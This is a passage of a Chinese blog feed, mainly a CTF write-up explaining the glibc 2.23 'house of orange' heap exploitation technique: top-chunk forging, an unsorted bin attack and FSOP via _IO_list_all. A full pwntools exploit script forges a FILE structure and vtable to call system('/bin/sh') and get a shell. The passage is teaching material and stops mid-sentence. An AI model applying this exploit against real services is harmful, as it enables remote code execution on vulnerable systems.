      &lt;h2 id=&quot;环境编译&quot;&gt;&lt;a href=&quot;#环境编译&quot; class=&quot;headerlink&quot; title=&quot;环境编译&quot;&gt;&lt;/a&gt;环境编译&lt;/h2&gt;&lt;p&gt;首先就是搭一下编译环境，（==最好选16的ubuntu==，我曾经觉得18的Ubuntu长得好看，然后在上面搭了一天的环境之后发现，并不能动态调试，然后重新在16里又再搭了一天）&lt;/p&gt;
&lt;h3 id=&quot;buildroot&quot;&gt;&lt;a href=&quot;#buildroot&quot; class=&quot;headerlink&quot; title=&quot;buildroot&quot;&gt;&lt;/a&gt;buildroot&lt;/h3&gt;&lt;p&gt;下载：&lt;a href=&quot;https://buildroot.org/download&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buildroot&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;解压之后，configs里面有一个&lt;code&gt;qemu_mips32r2el_malta_defconfig&lt;/code&gt;这样的配置，可以进去找找看有没有，我们回到主目录，直接&lt;code&gt;make qemu_mips32r2el_malta_defconfig&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;coyote@ubuntu:~/buildroot&lt;span class=&quot;number&quot;&gt;-2020.02&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1&lt;/span&gt;$ make qemu_mips32r2el_malta_defconfig&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;coyote@ubuntu:~/buildroot&lt;span class=&quot;number&quot;&gt;-2020.02&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.1&lt;/span&gt;$ make&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;make qemu…那个命令就是配置相对应的环境，就不用手动&lt;code&gt;make menuconfig&lt;/code&gt; 去设置了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="others" scheme="https://c0yo7e.github.io/tags/others/"/>
    
  </entry>
  
  <entry>
    <title>house_of_orange</title>
    <link href="https://c0yo7e.github.io/2020/03/10/house-of-orange/"/>
    <id>https://c0yo7e.github.io/2020/03/10/house-of-orange/</id>
    <published>2020-03-10T03:44:04.000Z</published>
    <updated>2020-08-02T05:11:31.637Z</updated>
    
    <content type="html"><![CDATA[<p>其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。</p><h3 id="对于house-of-orange操作的理解（glibc2-23）"><a href="#对于house-of-orange操作的理解（glibc2-23）" class="headerlink" title="对于house of orange操作的理解（glibc2.23）"></a>对于house of orange操作的理解（glibc2.23）</h3><p>大体上是，没有<font color="red">free</font>函数，通过<font color="red">改写top chunk</font>，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。</p><a id="more"></a><p>在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，如果都不符合，接下来_int_malloc函数会试图使用 top chunk。</p><p>如果top chunk也无法满足的话，会执行以下的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则需要执行 <code>sysmalloc</code>来向系统申请更多的空间。</p><p>但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展（就是malloc的size要小于mmap的size），之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这里是对top chunk 的合法性的检查。</p><p>想要伪造 ++top chunk++，就要满足以下几点：</p><blockquote><ul><li>伪造的 size 必须要对齐到内存页</li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ul></blockquote><p><font color="red">fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。</font></p><p>这里用houseoforange这个题来操作一下吧</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这题没有free操作，让人很容易联想得到house_of_orange的操作，upgrade对写入的size没有检查，可以直接溢出。</p><p>它结合了house of orange、unsorted bin attack 和FSOP的知识点</p><blockquote><p><code>house of orange</code>使在没有free的条件下改写topchunk，下一次malloc一个大于topchunk的size则可以将它写进unsorted bin的队列了</p><p><code>unsorted bin attack</code>，通过malloc large bin（&gt;=512)，可以达到同时leak libc和heap的效果。随后再利用upgrade溢出，构造new chunk，在它的bk处存入_IO_list_all-0x10的地址（这个注意，unsorted bin attack的bk覆写一定是在之前并没有add的堆块，即被free掉的或者和这题的覆写一样的）</p><p><code>FSOP</code>，通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。</p></blockquote><p>其中，unsorted bin attack和FSOP都是在最后一步malloc（0x10）的时候才实现的</p><h4 id="关于IO-FILE"><a href="#关于IO-FILE" class="headerlink" title="关于IO FILE"></a>关于IO FILE</h4><p>后面两步都会与一个叫<code>_IO_FILE_plus</code>的结构体有关系，那我们就先来看一下这个结构体吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而指向这个结构体的指针叫做<font color="red">_IO_list_all</font>，它存在于符号表内（即可以libc.sym[‘_IO_list_all’]操作），定义如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern struct _IO_FILE_plus *_IO_list_all;</span><br></pre></td></tr></table></figure><p>_IO_list_all一般指向的都是_IO_2_1_stderr<br>正常的程序中存在<code>stderr</code>、<code>sdout</code>以及<code>stdin</code>三个<code>IO FILE</code>，他们之间的关系呢大概是这样的</p><p><img src="/2020/03/10/house-of-orange/1.png" alt></p><p>就是</p><blockquote><p>_IO_list_all-&gt;_IO_2_1_stderr</p><p>_IO_2_1_stderr-&gt;_IO_2_1_stdout</p><p>_IO_2_1_stdout-&gt;_IO_2_1_stdin</p></blockquote><p>既然它牵扯到了IO FILE结构体里的东西，那我们就再倒回来说说这个结构体吧</p><p>_IO_FILE_plus结构体的第一part IO FILE的file结构（用gdb来看吧）</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus *) <span class="number">0x7f733765e540</span>)</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540026</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7f733765e620</span> &lt;_IO_2_1_stdout_&gt;, </span><br><span class="line">    _fileno = <span class="number">2</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = <span class="number">0x7f733765f770</span> &lt;_IO_stdfile_2_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f733765d660</span> &lt;_IO_wide_data_2&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f733765c6e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>chain指向的是下一个IO FILE结构体</p><p>而vtable呢是一个虚表指针，指向的是<code>_IO_file_jumps</code></p><p>刚好_IO_FILE_plus的第二part就是这个虚表了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在我们将IO_list_all链接进unsorted bin之后，unsortedbin的结构被破坏（IO_read_ptr=0,即size=0），再进行malloc就会触发malloc printerr报错</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">           || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                                &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">         malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br></pre></td></tr></table></figure><p>触发之后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数大致调用链</span><br><span class="line">mallloc_printerr-&gt; __libc_message—&gt;<span class="built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</span><br><span class="line">而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数</span><br><span class="line"><span class="comment">//define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure><p>_IO_flush_all_lockp源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  FILE *fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line">  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/</span><br><span class="line">           || (_IO_vtable_offset (fp) == 0</span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br><span class="line">        result = EOF;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想调用到IO_overflow,就要满足if的绕过条件，即：</p><blockquote><p>((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p><p>或者是</p><p>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以将write_base-&gt;0,write_ptr-&gt;0x1,满足write_base&lt;write_ptr</span><br><span class="line">也可以改_wide_data为原old_top-0x10就好了，fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，在wide_data的io结构里，writer_base变成了之前的read_end,即我们构造的fd，writer_ptr变成了read_base,即我们构造的bk（io_list_all-0x10),只要满足前者的等式就好了</span><br></pre></td></tr></table></figure><p>第一种会相对来说方便一点</p><p>然后把vtable指向自己，再把system填入IO_OVERFLEW，执行的时候就可以getshell了</p><h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./houseoforange'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">p.send(name)</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(price))</span><br><span class="line">p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">upgrade(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfa1</span>),<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfb0</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>) <span class="comment">#in unsorted bin list</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">8</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">1640</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#满足_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># pay = 'a'*0x400</span></span><br><span class="line"><span class="comment"># pay += p64(0) + p64(0x21) + 'a'*0x10</span></span><br><span class="line"><span class="comment"># io_file = '/bin/sh\x00' + p64(0x61) #'/bin/sh'是IO FILE，最后会作为IO_overflower的参数  victim-&gt;size=0</span></span><br><span class="line"><span class="comment"># io_file += p64(0) +p64(_IO_list_all-0x10) #unsorted bin attack  把list_all写进unsorted bin队列里面，即list_all-&gt;构造的堆块处(not io_stderr)</span></span><br><span class="line"><span class="comment"># io_file += p64(0) + p64(1) #绕检查_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 18</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 3</span></span><br><span class="line"><span class="comment"># io_file += p64(heap_addr+0x508) #vtable   -&gt;指向自己</span></span><br><span class="line"><span class="comment"># pay += io_file + p64(0)*2</span></span><br><span class="line"><span class="comment"># pay += p64(system)</span></span><br><span class="line"><span class="comment"># upgrade(0x800,pay,32,1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">payload=<span class="string">"x"</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">666</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk=<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x61</span>)<span class="comment">#why ? io_file?</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(heap_addr+<span class="number">0x420</span>) <span class="comment"># wide_data -&gt; read_end  然后就会调用虚表+0x18偏移处的函数了</span></span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_addr+<span class="number">0x528</span>) </span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">upgrade(<span class="number">0x800</span>,payload,<span class="number">32</span>,<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortbin.bk也被改写成了&amp;IO_list_all-0x10，所以此时的victim-&gt;size=0那么不会通过校验，进入malloc_printerr，触发异常。</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>) <span class="comment">#如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="关于构造chunk的size为什么是0x60："><a href="#关于构造chunk的size为什么是0x60：" class="headerlink" title="关于构造chunk的size为什么是0x60："></a>关于构造chunk的size为什么是0x60：</h4><blockquote><p>首先victim-&gt;size=0（IO 